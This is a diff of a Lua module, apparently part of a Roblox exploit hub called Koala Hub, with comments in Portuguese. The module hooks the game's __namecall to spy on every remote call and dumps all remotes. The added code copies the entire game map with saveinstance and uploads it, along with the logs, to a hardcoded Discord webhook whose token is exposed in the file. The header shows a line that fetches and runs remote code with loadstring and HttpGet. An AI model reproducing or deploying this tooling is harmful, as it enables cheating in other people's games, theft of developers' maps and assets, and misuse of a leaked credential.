@@ -1,33 +1,41 @@
 --[[
-    KOALA HUB — MODULO SPY / DUMP DE REMOTES
-    -----------------------------------------
-    1) Ao carregar: varre o jogo inteiro e manda para o webhook do Discord
-       uma lista com TODOS os RemoteEvent / RemoteFunction / BindableEvent /
-       BindableFunction encontrados (caminho completo + classe).
-    2) Fica ouvindo (spy): toda chamada FireServer / InvokeServer feita
-       pelo jogo e capturada e enviada pro webhook com nome, caminho e
-       argumentos serializados.
-    3) Se a aba "Spy" existir no Koala Hub, aparecem toggles para ligar/
-       desligar o spy e o dump inicial. Se a UI nao abrir, o modulo
-       continua funcionando em segundo plano (spy ligado por padrao).
+    KOALA HUB — MODULO SPY / DUMP DE REMOTES + ARQUIVOS PRO DISCORD
+    ----------------------------------------------------------------
+    1) Ao carregar: varre o jogo e envia para o webhook do Discord um
+       ARQUIVO .txt com TODOS os RemoteEvent / RemoteFunction /
+       BindableEvent / BindableFunction (caminho completo + classe),
+       junto com PlaceId / JobId / nome do jogo.
+    2) Spy ao vivo: toda chamada FireServer / InvokeServer feita pelo
+       jogo e capturada e enviada pro webhook (lotes de texto) e
+       acumulada num log de sessao que pode ser enviado como .txt.
+    3) Mapa: botao "Salvar mapa (.rbxl)" usa saveinstance() do executor,
+       e se o arquivo couber no limite do Discord, envia o .rbxl pro
+       webhook (abre no Roblox Studio / Studio Lite). Se for grande
+       demais, avisa o caminho do arquivo no workspace do executor.
+    4) Gravacoes: botao que envia os .json do Auto Fase
+       (KoalaHub/gravacoes/) pro webhook como anexos.
 
     Uso standalone (dentro do jogo, com executor):
         loadstring(game:HttpGet("https://raw.githubusercontent.com/rodrigsapps/KoalaUI/main/KoalaSpy.lua"))()
 
-    Integracao no KoalaHub.lua (opcional, adiciona a aba Spy):
+    Integracao no KoalaHub.lua (ja presente):
         pcall(function()
-            local Spy = loadstring(game:HttpGet("https://raw.githubusercontent.com/rodrigsapps/KoalaUI/main/KoalaSpy.lua"))()
+            local Spy = loadstring(game:HttpGet(".../KoalaSpy.lua"))()
             Spy(Koala, Window, Flags)
         end)
 
-    ATENCAO: o webhook fica visivel no codigo. Quem tiver acesso ao script
-    pode postar no seu canal. Se isso for problema, gere um webhook novo
-    e troque a constante WEBHOOK_URL abaixo.
+    ATENCAO: o webhook fica visivel no codigo. Quem tiver acesso ao
+    script pode postar no seu canal. Se isso for problema, gere um
+    webhook novo e troque a constante WEBHOOK_URL abaixo.
 
-    Executores: precisa de getnamecallmethod + hookmetamethod (ou
-    hookfunction) para o spy. Sem eles, so o dump inicial funciona.
-    HttpPost/request sao detectados automaticamente; na ultima opcao
-    usa HttpService:PostAsync.
+    NOTA DE ESCOPO: este modulo envia somente o que ELE gera (dump,
+    logs, mapa do jogo, gravacoes do Koala). Executores nao dao acesso
+    a pastas do aparelho (Downloads etc.) — as funcoes de arquivo sao
+    limitadas ao workspace do executor.
+
+    Executores: spy precisa de getnamecallmethod + hookmetamethod (ou
+    hookfunction). Mapa precisa de saveinstance. Arquivos precisam de
+    request/http_request + writefile/readfile/listfiles.
 ]]
 
 return function(Koala, Window, Flags)
@@ -41,17 +49,20 @@ local LP = Players.LocalPlayer
 --  CONFIG
 --==================================================================--
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1546164688994177112/FVxL0qlwRYpI6ITaoTbK0qqchk2cxCrxB_r_5DDDV_HGEAzmYB5lDBwCyqtLI2GYiZ52"
-local INTERVALO_FILA   = 5      -- segundos entre envios em lote
-local MAX_MSG          = 1800   -- limite seguro por mensagem (Discord: 2000)
-local MAX_FILA         = 400    -- descarta o mais antigo alem disso
-local MAX_ARG_STR      = 300    -- corta strings gigantes nos argumentos
-local MAX_PROFUND      = 4      -- profundidade max. ao serializar tabelas
+local INTERVALO_FILA = 5           -- segundos entre lotes de texto
+local MAX_MSG        = 1800        -- limite por mensagem (Discord: 2000)
+local MAX_FILA       = 400
+local MAX_ARG_STR    = 300
+local MAX_PROFUND    = 4
+local MAX_UPLOAD     = 24 * 1024 * 1024  -- 24 MB (limite Discord free ~25 MB)
+local MAX_LOG_SESSAO = 5000        -- linhas guardadas do spy
+local PASTA_GRAVACOES= "KoalaHub/gravacoes"
 
 --==================================================================--
 --  FLAGS PADRAO
 --==================================================================--
 Flags = Flags or {}
-if Flags.SpyAtivo  == nil then Flags.SpyAtivo  = true end
+if Flags.SpyAtivo   == nil then Flags.SpyAtivo   = true end
 if Flags.DumpInicio == nil then Flags.DumpInicio = true end
 
 --==================================================================--
@@ -71,23 +82,27 @@ local function env(nome)
     return nil
 end
 
--- funcao de HTTP request do executor (synapse/sirhurt/fluxus/etc)
 local httpRequest = env("request") or env("http_request")
     or (syn and syn.request) or (http and http.request)
     or (fluxus and fluxus.request)
 
+local FS = {
+    write = env("writefile"),  read  = env("readfile"),
+    list  = env("listfiles"),  isfile= env("isfile"),
+    mkdir = env("makefolder"), isdir = env("isfolder"),
+}
+local saveinstance = env("saveinstance")
+
+-- POST texto simples
 local function postWebhook(content)
     if not content or #content == 0 then return false end
     if #content > 1990 then content = content:sub(1, 1990) end
-
     local body = HttpService:JSONEncode({ content = content })
 
-    -- 1) request do executor (permite header customizado)
     if httpRequest then
         local ok, res = pcall(function()
             return httpRequest({
-                Url = WEBHOOK_URL,
-                Method = "POST",
+                Url = WEBHOOK_URL, Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
                 Body = body,
             })
@@ -97,14 +112,48 @@ local function postWebhook(content)
         end
     end
 
-    -- 2) HttpService:PostAsync (funciona se o jogo permitir HttpEnabled)
     local ok2 = pcall(function()
         HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
     end)
     return ok2
 end
 
--- fila de mensagens -> envio em lote (evita rate limit do Discord)
+-- POST com anexo (multipart/form-data) — precisa do request do executor
+local function postWebhookFile(nomeArquivo, conteudo, mensagem)
+    if not httpRequest then return false, "executor sem request" end
+    if not conteudo or #conteudo == 0 then return false, "vazio" end
+
+    local boundary = "----KoalaBoundary" .. tostring(math.random(100000, 999999999))
+    local payload  = HttpService:JSONEncode({ content = mensagem or "" })
+
+    local corpo = table.concat({
+        "--" .. boundary .. "\r\n",
+        'Content-Disposition: form-data; name="payload_json"\r\n',
+        "Content-Type: application/json\r\n\r\n",
+        payload, "\r\n",
+        "--" .. boundary .. "\r\n",
+        'Content-Disposition: form-data; name="files[0]"; filename="', nomeArquivo, '"\r\n',
+        "Content-Type: application/octet-stream\r\n\r\n",
+        conteudo, "\r\n",
+        "--" .. boundary .. "--\r\n",
+    })
+
+    local ok, res = pcall(function()
+        return httpRequest({
+            Url = WEBHOOK_URL, Method = "POST",
+            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
+            Body = corpo,
+        })
+    end)
+    if ok and res and (res.StatusCode == 200 or res.StatusCode == 204) then
+        return true
+    end
+    return false, ok and ("HTTP " .. tostring(res and res.StatusCode)) or tostring(res)
+end
+
+--==================================================================--
+--  FILA DE TEXTO (spy ao vivo) — evita rate limit
+--==================================================================--
 local fila = {}
 local enviando = false
 
@@ -123,21 +172,31 @@ task.spawn(function()
                 local parte = table.remove(fila, 1)
                 local atual = table.concat(lote, "\n")
                 if #atual + #parte + 1 > MAX_MSG then
-                    table.insert(fila, 1, parte) -- devolve pro proximo lote
+                    table.insert(fila, 1, parte)
                     break
                 end
                 table.insert(lote, parte)
             end
-            if #lote > 0 then
-                postWebhook(table.concat(lote, "\n"))
-            end
+            if #lote > 0 then postWebhook(table.concat(lote, "\n")) end
             enviando = false
         end
     end
 end)
 
 --==================================================================--
---  SERIALIZACAO DE VALORES (para logar argumentos)
+--  INFO DO JOGO
+--==================================================================--
+local function infoJogo()
+    local nomeJogo = "?"
+    pcall(function()
+        nomeJogo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    return string.format("Jogo: %s | PlaceId: %d | JobId: %s | Player: %s",
+        nomeJogo, game.PlaceId, tostring(game.JobId), LP and LP.Name or "?")
+end
+
+--==================================================================--
+--  SERIALIZACAO DE VALORES
 --==================================================================--
 local serializar
 serializar = function(v, prof)
@@ -161,16 +220,13 @@ serializar = function(v, prof)
         return string.format("CFrame(%.2f, %.2f, %.2f)", p.X, p.Y, p.Z)
     elseif t == "Color3" then
         return string.format("Color3(%.2f, %.2f, %.2f)", v.R, v.G, v.B)
-    elseif t == "BrickColor" then
-        return "BrickColor(" .. tostring(v) .. ")"
-    elseif t == "EnumItem" then
+    elseif t == "BrickColor" or t == "EnumItem" then
         return tostring(v)
     elseif t == "UDim2" then
         return "UDim2(" .. tostring(v) .. ")"
     elseif t == "table" then
         if prof >= MAX_PROFUND then return "{...}" end
-        local partes = {}
-        local n = 0
+        local partes, n = {}, 0
         for k, val in pairs(v) do
             n = n + 1
             if n > 30 then table.insert(partes, "...") break end
@@ -198,38 +254,53 @@ local function caminhoDe(inst)
 end
 
 --==================================================================--
---  1) DUMP INICIAL — todos os remotes do jogo
+--  1) DUMP INICIAL — arquivo .txt com todos os remotes
 --==================================================================--
 local CLASSES_REMOTE = {
     RemoteEvent = true, RemoteFunction = true,
     BindableEvent = true, BindableFunction = true,
 }
 
-local function dumpRemotes()
-    local linhas = {}
+local function gerarDump()
+    local linhas = {
+        "KOALA SPY — DUMP DE REMOTES",
+        infoJogo(),
+        string.rep("-", 60),
+    }
+    local n = 0
     for _, inst in ipairs(game:GetDescendants()) do
         if CLASSES_REMOTE[inst.ClassName] then
+            n = n + 1
             table.insert(linhas, string.format("[%s] %s", inst.ClassName, caminhoDe(inst)))
         end
     end
-    table.sort(linhas)
+    table.insert(linhas, string.rep("-", 60))
+    table.insert(linhas, "Total: " .. n .. " remotes")
+    return linhas, n
+end
 
-    local nomeJogo = "?"
-    pcall(function()
-        nomeJogo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-    end)
-    enfileirar(string.format("**[Koala Spy] DUMP de remotes — %s em %s — %d encontrados**",
-        LP and LP.Name or "?", nomeJogo, #linhas))
-    for _, l in ipairs(linhas) do
-        enfileirar(l)
+local function dumpRemotes()
+    local linhas, n = gerarDump()
+    local conteudo = table.concat(linhas, "\n")
+
+    -- tenta como ARQUIVO; se falhar, cai para lotes de texto
+    local ok = postWebhookFile(
+        string.format("koala_dump_%d.txt", game.PlaceId),
+        conteudo,
+        "**[Koala Spy] DUMP — " .. n .. " remotes**"
+    )
+    if not ok then
+        enfileirar(string.format("**[Koala Spy] DUMP — %d remotes**", n))
+        for i = 4, #linhas do enfileirar(linhas[i]) end
     end
-    return #linhas
+    return n
 end
 
 --==================================================================--
---  2) SPY — escuta FireServer / InvokeServer em tempo real
+--  2) SPY AO VIVO + LOG DE SESSAO
 --==================================================================--
 local spyLigado = false
+local logSessao = {}
 local getnamecallmethod = env("getnamecallmethod")
 local hookmetamethod    = env("hookmetamethod")
 local hookfunction      = env("hookfunction")
@@ -243,16 +314,17 @@ end
 local function logarChamada(self, metodo, args)
     if not Flags.SpyAtivo then return end
     if not ehRemoteValido(self) then return end
-    local nome = self.Name
-    local caminho = caminhoDe(self)
-    local argStr = serializarArgs(args)
-    enfileirar(string.format("[SPY] %s :%s( %s )\n      -> %s", nome, metodo, argStr, caminho))
+    local linha = string.format("[SPY] %s :%s( %s )\n      -> %s",
+        self.Name, metodo, serializarArgs(args), caminhoDe(self))
+    enfileirar(linha)
+    if #logSessao >= MAX_LOG_SESSAO then table.remove(logSessao, 1) end
+    table.insert(logSessao, linha)
 end
 
 local function ligarSpy()
     if spyLigado then return true end
 
-    -- metodo 1: hookmetamethod (__namecall) — o mais comum nos executores
+    -- metodo 1: hookmetamethod (__namecall) — padrao nos executores
     if hookmetamethod and getnamecallmethod then
         local velho
         velho = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
@@ -266,7 +338,7 @@ local function ligarSpy()
         return true
     end
 
-    -- metodo 2: hookfunction nos metodos das CLASSES (fallback, pega todas as instancias)
+    -- metodo 2: hookfunction nos metodos das CLASSES (pega todas as instancias)
     if hookfunction then
         local okFire = pcall(function()
             local velho
@@ -292,7 +364,119 @@ local function ligarSpy()
 end
 
 --==================================================================--
---  3) ABA NA UI (opcional)
+--  3) MAPA (.rbxl) via saveinstance
+--==================================================================--
+local function snapshotArquivos()
+    local set = {}
+    if FS.list then
+        pcall(function()
+            for _, f in ipairs(FS.list("")) do set[tostring(f)] = true end
+        end)
+    end
+    return set
+end
+
+local function salvarEEnviarMapa()
+    if not saveinstance then
+        return notify("Seu executor nao tem saveinstance — nao da pra extrair o mapa.", 5)
+    end
+    if not FS.read or not FS.list then
+        return notify("Executor sem readfile/listfiles.", 4)
+    end
+
+    notify("Salvando mapa... pode demorar em jogo grande.", 4)
+
+    local antes = snapshotArquivos()
+    local nome = "koala_mapa_" .. game.PlaceId
+
+    -- executores variam na assinatura; tenta as comuns
+    local ok = pcall(function() saveinstance(game, { FileName = nome, Mode = "full" }) end)
+    if not ok then ok = pcall(function() saveinstance(game, { FileName = nome }) end) end
+    if not ok then ok = pcall(function() saveinstance(game) end) end
+    if not ok then ok = pcall(saveinstance) end
+    if not ok then return notify("saveinstance falhou neste executor.", 4) end
+
+    task.wait(2) -- alguns executores escrevem de forma assincrona
+
+    -- acha o .rbxl novo
+    local arquivo
+    pcall(function()
+        for _, f in ipairs(FS.list("")) do
+            f = tostring(f)
+            if not antes[f] and (f:lower():match("%.rbxl$") or f:lower():match("%.rbxm$")) then
+                arquivo = f
+            end
+        end
+        -- fallback: procura pelo nome que pedimos
+        if not arquivo then
+            for _, f in ipairs(FS.list("")) do
+                f = tostring(f)
+                if f:lower():find(nome:lower(), 1, true) then arquivo = f end
+            end
+        end
+    end)
+
+    if not arquivo then
+        return notify("Mapa salvo, mas nao achei o arquivo no workspace. Procura um .rbxl novo la.", 6)
+    end
+
+    local okR, dados = pcall(FS.read, arquivo)
+    if not okR or not dados then
+        return notify("Salvo em: " .. arquivo .. " (nao consegui ler pra enviar)", 6)
+    end
+
+    if #dados > MAX_UPLOAD then
+        return notify(string.format("Mapa tem %.1f MB — passa do limite do Discord. Arquivo: %s",
+            #dados / 1048576, arquivo), 8)
+    end
+
+    local nomeArq = arquivo:match("([^/\\]+)$") or (nome .. ".rbxl")
+    local okU, err = postWebhookFile(nomeArq, dados, "**[Koala Spy] MAPA .rbxl** — " .. infoJogo())
+    if okU then
+        notify("Mapa enviado pro Discord! Baixa e abre no Studio.", 5)
+    else
+        notify("Salvo em " .. arquivo .. " mas falhou o upload (" .. tostring(err) .. ")", 6)
+    end
+end
+
+--==================================================================--
+--  4) ENVIO DE ARQUIVOS EXTRAS (log do spy, gravacoes)
+--==================================================================--
+local function enviarLogSessao()
+    if #logSessao == 0 then return notify("Log vazio — nada capturado ainda.", 3) end
+    local conteudo = "KOALA SPY — LOG DE SESSAO\n" .. infoJogo() .. "\n"
+        .. string.rep("-", 60) .. "\n" .. table.concat(logSessao, "\n")
+    local ok, err = postWebhookFile("koala_spy_log_" .. os.time() .. ".txt", conteudo,
+        "**[Koala Spy] Log da sessao — " .. #logSessao .. " chamadas**")
+    notify(ok and "Log enviado!" or ("Falha: " .. tostring(err)), 3)
+end
+
+local function enviarGravacoes()
+    if not FS.list or not FS.read then
+        return notify("Executor sem listfiles/readfile.", 3)
+    end
+    local enviados = 0
+    pcall(function()
+        for _, f in ipairs(FS.list(PASTA_GRAVACOES)) do
+            f = tostring(f)
+            if f:lower():match("%.json$") then
+                local okR, dados = pcall(FS.read, f)
+                if okR and dados and #dados > 0 and #dados < MAX_UPLOAD then
+                    local nomeArq = f:match("([^/\\]+)$")
+                    if postWebhookFile("koala_" .. nomeArq, dados,
+                        "**[Koala Spy] Gravacao Auto Fase:** " .. nomeArq) then
+                        enviados = enviados + 1
+                    end
+                    task.wait(1)
+                end
+            end
+        end
+    end)
+    notify(enviados > 0 and (enviados .. " gravacao(oes) enviada(s).") or "Nenhuma gravacao encontrada.", 3)
+end
+
+--==================================================================--
+--  5) ABA NA UI (opcional)
 --==================================================================--
 if Window then
     local ok, err = pcall(function()
@@ -300,7 +484,7 @@ if Window then
 
         SpyTab:Paragraph({
             Title = "Koala Spy",
-            Desc = "Dump de remotes + spy ao vivo, tudo enviado pro Discord (webhook configurado no script).",
+            Desc = "Dump de remotes + spy ao vivo + mapa .rbxl, tudo enviado como arquivo pro Discord.",
         })
 
         SpyTab:Toggle({
@@ -313,7 +497,7 @@ if Window then
         })
 
         SpyTab:Button({
-            Title = "Reenviar DUMP de remotes agora",
+            Title = "Reenviar DUMP (.txt) agora",
             Callback = function()
                 task.spawn(function()
                     local n = dumpRemotes()
@@ -323,11 +507,26 @@ if Window then
         })
 
         SpyTab:Button({
+            Title = "Salvar mapa (.rbxl) e enviar pro Discord",
+            Callback = function() task.spawn(salvarEEnviarMapa) end,
+        })
+
+        SpyTab:Button({
+            Title = "Enviar log do spy (.txt)",
+            Callback = function() task.spawn(enviarLogSessao) end,
+        })
+
+        SpyTab:Button({
+            Title = "Enviar gravacoes Auto Fase (.json)",
+            Callback = function() task.spawn(enviarGravacoes) end,
+        })
+
+        SpyTab:Button({
             Title = "Testar webhook",
             Callback = function()
                 task.spawn(function()
-                    local okEnvio = postWebhook("**[Koala Spy] Teste de webhook OK — " .. (LP and LP.Name or "?") .. "**")
-                    notify(okEnvio and "Webhook OK!" or "Falha no envio (verifique request/http).", 3)
+                    local okEnvio = postWebhook("**[Koala Spy] Teste OK — " .. infoJogo() .. "**")
+                    notify(okEnvio and "Webhook OK!" or "Falha no envio (request/http).", 3)
                 end)
             end,
         })
@@ -341,7 +540,7 @@ end
 --  BOOT
 --==================================================================--
 task.spawn(function()
-    task.wait(2) -- deixa o jogo assentar antes de varrer
+    task.wait(2)
 
     local spyOk = ligarSpy()
 
@@ -349,7 +548,7 @@ task.spawn(function()
         local n = dumpRemotes()
         notify(string.format("Dump: %d remotes | Spy: %s", n, spyOk and "ON" or "OFF (sem hook)"), 4)
     else
-        notify("Spy: " .. (spyOk and "ON" or "OFF (executor sem hookmetamethod/hookfunction)"), 4)
+        notify("Spy: " .. (spyOk and "ON" or "OFF (executor sem hook)"), 4)
     end
 end)
 
